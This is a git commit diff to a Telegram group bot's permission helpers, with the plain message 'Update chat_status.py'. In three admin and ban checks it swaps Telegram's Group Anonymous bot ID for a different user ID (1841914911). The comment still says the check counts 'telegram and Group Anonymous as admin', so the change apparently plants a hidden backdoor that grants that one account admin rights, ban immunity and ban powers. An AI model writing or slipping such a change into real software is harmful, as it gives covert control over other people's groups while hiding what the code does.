84e5cbfff4e6e87219717e6ded2e198af23a16b7
Mr Broken <74880754+mrxbroken011@users.noreply.github.com>
2024-06-12 00:31:06 +0530

    Update chat_status.py

--- JarvisRobo/modules/helper_funcs/chat_status.py
+++ JarvisRobo/modules/helper_funcs/chat_status.py
@@ -40,7 +40,7 @@ def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
         or user_id in DRAGONS
         or user_id in DEV_USERS
         or chat.all_members_are_administrators
-        or user_id in [777000, 1087968824]
+        or user_id in [777000, 1841914911]
     ):  # Count telegram and Group Anonymous as admin
         return True
     if not member:
@@ -83,7 +83,7 @@ def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -
         or user_id in WOLVES
         or user_id in TIGERS
         or chat.all_members_are_administrators
-        or user_id in [777000, 1087968824]
+        or user_id in [777000, 1841914911]
     ):  # Count telegram and Group Anonymous as admin
         return True
 
@@ -365,7 +365,7 @@ def user_can_ban(func):
         if (
             not (member.can_restrict_members or member.status == "creator")
             and user not in DRAGONS
-            and user not in [777000, 1087968824]
+            and user not in [777000, 1841914911]
         ):
             update.effective_message.reply_text("ðŸ˜¹ Sorry You can't do that")
             return ""
